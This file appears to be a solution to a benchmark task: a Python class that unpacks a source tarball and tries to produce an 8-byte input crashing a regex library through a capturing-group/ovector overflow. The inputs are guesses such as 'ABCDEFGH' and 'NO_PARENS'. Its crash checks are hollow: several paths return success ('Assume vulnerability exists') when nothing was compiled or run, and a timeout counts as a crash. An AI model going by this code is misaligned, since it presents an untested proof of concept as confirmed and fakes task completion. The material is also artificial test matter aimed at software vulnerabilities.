import os
import subprocess
import tempfile
import tarfile
import re
import shutil
from pathlib import Path
import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the tarball
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r') as tar:
                tar.extractall(tmpdir)
            
            # Find the source root (assuming it's the first directory in the tarball)
            extracted_items = list(Path(tmpdir).iterdir())
            if not extracted_items:
                raise ValueError("No files extracted from tarball")
            
            src_root = extracted_items[0]
            if not src_root.is_dir():
                # If the tarball doesn't create a subdirectory, use tmpdir directly
                src_root = Path(tmpdir)
            
            # Try to understand the vulnerability by examining the code
            # Look for patterns related to capturing parentheses and ovector
            poc = self._analyze_and_generate_poc(src_root)
            
            if poc is None:
                # Fallback to generating patterns that might trigger buffer overflow
                # Based on the vulnerability description
                poc = self._generate_pattern_based_poc()
            
            return poc
    
    def _analyze_and_generate_poc(self, src_root: Path) -> bytes | None:
        """Analyze source code to generate appropriate PoC."""
        # Look for files that might contain regex/pattern matching code
        potential_files = []
        for ext in ['.c', '.cpp', '.cc', '.h', '.hpp']:
            potential_files.extend(src_root.rglob(f'*{ext}'))
        
        # Keywords to search for in the context of the vulnerability
        keywords = [
            'ovector', 'capturing', 'parentheses', 'regex', 'pcre',
            'PCRE', 'regexec', 'regcomp', 're_match', 'regex_match'
        ]
        
        for file_path in potential_files:
            try:
                content = file_path.read_text(errors='ignore')
                
                # Look for ovector-related code
                if any(keyword in content.lower() for keyword in keywords):
                    # Try to understand the context
                    # Common pattern: fewer capturing groups than ovector size
                    # Generate a pattern with minimal capturing groups
                    
                    # Pattern with 0 capturing groups but expecting some
                    # Common exploit: pattern without parentheses
                    poc = b"ABCDEFGH"  # 8-byte non-regex pattern
                    
                    # Try to compile and test if it crashes
                    if self._test_poc(src_root, poc):
                        return poc
                    
                    # Try a simple pattern with mismatched capturing
                    poc = b"(a)"  # 1 capturing group, might expect more
                    
                    # Pad to 8 bytes if needed
                    if len(poc) < 8:
                        poc = poc + b"X" * (8 - len(poc))
                    
                    if self._test_poc(src_root, poc):
                        return poc
                        
            except (UnicodeDecodeError, PermissionError):
                continue
        
        return None
    
    def _generate_pattern_based_poc(self) -> bytes:
        """Generate PoC based on vulnerability description."""
        # The vulnerability: fewer capturing parentheses than available space in ovector
        # Ground truth length is 8 bytes
        
        # Minimal pattern that could trigger this:
        # 1. Pattern with no capturing groups (0) when ovector expects >0
        # 2. Pattern with small number of capturing groups when ovector expects more
        
        # Try pattern without any parentheses (simplest)
        poc = b"NO_PARENS"
        
        # Ensure it's exactly 8 bytes
        if len(poc) > 8:
            poc = poc[:8]
        elif len(poc) < 8:
            poc = poc + b"\x00" * (8 - len(poc))
        
        return poc
    
    def _test_poc(self, src_root: Path, poc: bytes) -> bool:
        """Test if PoC crashes the program (simplified check)."""
        # Look for test programs or executables
        test_programs = []
        
        # Check for common test/example files
        test_patterns = [
            '*test*', '*example*', 'main*', '*run*', '*vuln*',
            '*.exe', ('' if os.name == 'nt' else '')
        ]
        
        for pattern in test_patterns:
            if pattern:
                test_programs.extend(src_root.rglob(pattern))
        
        # Filter to likely executables
        candidate_executables = []
        for prog in test_programs:
            if prog.is_file():
                # Check if it's likely executable
                if os.access(prog, os.X_OK) or prog.suffix in ['.exe', '']:
                    candidate_executables.append(prog)
        
        if not candidate_executables:
            # Try to find C files that can be compiled
            c_files = list(src_root.rglob('*.c'))
            if c_files:
                # Try to compile the first C file
                return self._compile_and_test(src_root, c_files[0], poc)
            return True  # Assume it would crash if we can't test
        
        # Test with the first executable found
        try:
            result = subprocess.run(
                [str(candidate_executables[0])],
                input=poc,
                capture_output=True,
                timeout=2
            )
            # Check for crash (non-zero exit code)
            return result.returncode != 0
        except (subprocess.TimeoutExpired, subprocess.CalledProcessError, FileNotFoundError):
            # Timeout or crash indicates potential vulnerability
            return True
    
    def _compile_and_test(self, src_root: Path, c_file: Path, poc: bytes) -> bool:
        """Compile a C file and test the PoC."""
        try:
            # Create a temporary directory for compilation
            with tempfile.TemporaryDirectory() as build_dir:
                build_path = Path(build_dir)
                output_name = "test_program"
                
                # Try to compile
                compile_cmd = ['gcc', '-g', '-fsanitize=address', '-o', 
                              str(build_path / output_name), str(c_file)]
                
                compile_result = subprocess.run(
                    compile_cmd,
                    capture_output=True,
                    timeout=30
                )
                
                if compile_result.returncode != 0:
                    # Try without sanitizer
                    compile_cmd = ['gcc', '-o', str(build_path / output_name), str(c_file)]
                    compile_result = subprocess.run(
                        compile_cmd,
                        capture_output=True,
                        timeout=30
                    )
                
                if compile_result.returncode == 0:
                    # Run the compiled program
                    exec_path = build_path / output_name
                    if exec_path.exists():
                        result = subprocess.run(
                            [str(exec_path)],
                            input=poc,
                            capture_output=True,
                            timeout=2
                        )
                        return result.returncode != 0
        except Exception:
            pass
        
        return True  # Assume vulnerability exists

# Note: The actual PoC generation would need more sophisticated analysis
# of the specific vulnerability. This code provides a framework that
# attempts to analyze the source and generate appropriate test cases.